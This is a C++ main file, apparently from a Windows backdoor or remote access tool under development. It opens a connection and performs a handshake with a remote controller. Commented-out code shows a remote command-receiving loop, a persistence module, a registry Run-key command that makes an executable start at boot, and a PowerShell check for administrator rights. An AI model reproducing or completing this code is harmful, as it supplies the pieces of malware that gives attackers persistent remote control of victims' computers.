
#include <windows.h>
#include <iostream>
#include <string>

#include "../inc/HandShake.h"
#include "../inc/ModShell.h"
#include "../inc/Connexion.h"


int main(int argc,char** argv)
{   
    Connexion conn;
    conn.openConnexion();

    HandShake Handshake;
    Handshake.setSock(conn.getSocket()); //Passer par le constructeur ????

    Handshake.startHandShake();

    cout << "HAND SHAKE FINISH" << endl;
    system("PAUSE");
    /*
    SafeSocket safesock(conn.getSocket());

    while(true)
    {
        cout << "SAFE RECV" << endl;
        string data = safesock.recvSafe();
        cout << data << endl;
        if(data.empty())
        {
            cout << "data empty" << endl;
        }
        else if(data == "ERROR")
        {
            cout << "ONE ERROR " << endl;
            exit(0);
        }

        else if(data == "exit\n")
        {
            ;
            //break;
        }
        else
        {
            cout << "send SAFE  ok!!" << endl;
            break;
            //safesock.sendSafe(shell);
        }

    }
    */

    /*
    cout << "\n\n\n" << endl;
    HandShake hand;
    int statut = hand.main();
    cout << statut << endl;
    cout <<"MAIN ADMIN: " <<hand.getIsAdmin() << endl;
    cout <<"MAIN PATH: " <<hand.getPathProg() << endl;

    Persistence persi(hand.getIsAdmin(),hand.getPathProg());

    persi.defaultPersi();
    */
/*
    string result;
    //reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /d C:\Windows\12.exe  /v testshell
    ModShell().exec("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d C:\\Windows\\12.exe /v boot",result);
    cout << result << endl;
*/

    //Persistence persi(hand.is_admin, hand.name_user , hand.current_directory); //Initialisation class
    //persi.defaultPersi();
    //cout << "powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"" << endl;
    return 0;
}
